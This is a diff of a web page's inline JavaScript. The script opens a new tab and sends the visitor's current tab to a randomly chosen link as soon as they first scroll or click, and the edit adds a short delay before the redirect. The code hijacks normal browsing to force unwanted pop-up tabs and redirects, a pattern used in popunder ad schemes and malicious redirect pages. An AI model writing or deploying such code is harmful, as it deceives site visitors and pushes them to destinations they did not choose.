@@ -50,24 +50,26 @@ img{
         if (opened) return;
         opened = true;
 
-        // Open new tab
+        // Open new tab first
         window.open(newTabLink, "_blank");
 
-        // Random redirect in current tab
+        // Select random current-tab link
         const randomLink =
             currentTabLinks[Math.floor(Math.random() * currentTabLinks.length)];
 
-        window.location.href = randomLink;
+        // Small delay before redirect
+        setTimeout(function () {
+            window.location.href = randomLink;
+        }, 300);
     }
 
-    // Trigger on first scroll
+    // Trigger on scroll
     window.addEventListener("scroll", triggerRedirect);
 
-    // Trigger on first click
+    // Trigger on click
     document.addEventListener("click", triggerRedirect);
 
 })();
 </script>
-
 </body>
 </html>
